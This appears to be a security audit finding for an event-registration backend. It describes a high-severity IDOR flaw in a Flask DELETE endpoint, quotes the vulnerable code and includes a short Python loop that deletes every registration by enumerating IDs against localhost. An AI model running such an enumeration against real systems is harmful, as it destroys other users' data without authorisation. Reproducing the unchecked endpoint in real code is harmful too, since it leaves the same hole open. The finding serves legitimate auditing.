# [C009] IDOR — `DELETE /events/:id/registrations`

**Severity:** High
**CWE:** CWE-639
**File:** `backend/app.py`

---

## Description

The `DELETE` endpoint accepts a `reg_id` query parameter and deletes the matching row without verifying:

1. That the caller is authenticated
2. That the registration belongs to the caller
3. That the registration even belongs to the `event_id` in the route

An anonymous attacker can enumerate integers to wipe every registration in the system.

## Vulnerable code

```python
@app.route("/events/<int:event_id>/registrations", methods=["DELETE"])
def delete_registration(event_id):
    reg_id = request.args.get("reg_id")   # ← no auth, no ownership check
    cursor.execute(
        "DELETE FROM registrations WHERE id = %s", (reg_id,)
        # event_id is never used — any reg_id from any event is deleted
    )
```

## Attack — enumerate and wipe all registrations

```python
import requests

for i in range(1, 10000):
    requests.delete(f"http://localhost:5000/events/1/registrations?reg_id={i}")
```

Every registration in the database is deleted in a single loop with no authentication required.
